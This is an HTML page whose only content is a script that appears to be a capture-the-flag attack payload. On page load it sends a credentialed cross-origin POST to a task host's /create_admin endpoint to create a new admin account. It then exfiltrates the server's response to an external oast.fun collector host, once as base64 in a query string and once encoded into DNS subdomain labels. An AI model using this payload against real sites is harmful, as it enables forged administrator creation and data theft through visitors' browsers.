<!DOCTYPE html>
<html>
<body>
<script>
(async () => {
  let respText = "";
  let status = "ERR";

  try {
    const r = await fetch("https://tasks.goidactf.ru:20246/create_admin", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      body: "new_admin_login=ctfadmin_" + Date.now(),
      credentials: "include",
      mode: "cors"
    });

    status = r.status;
    respText = await r.text();

  } catch (e) {
    respText = "FETCH_ERR:" + e;
  }

  /* ===== 1. QUERY‑EXFIL (полный ответ) ===== */
  const full = btoa(unescape(encodeURIComponent(
    status + "|" + respText
  )));

  new Image().src =
    "https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/?q=" +
    encodeURIComponent(full);

  /* ===== 2. DNS‑EXFIL (коротко) ===== */
  const short = (status + "|" + respText.slice(0,40))
    .split("")
    .map(c => c.charCodeAt(0).toString(36))
    .join("-")
    .slice(0,60);

  new Image().src =
    "https://" + short +
    ".zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/";

})();
</script>
</body>
</html>
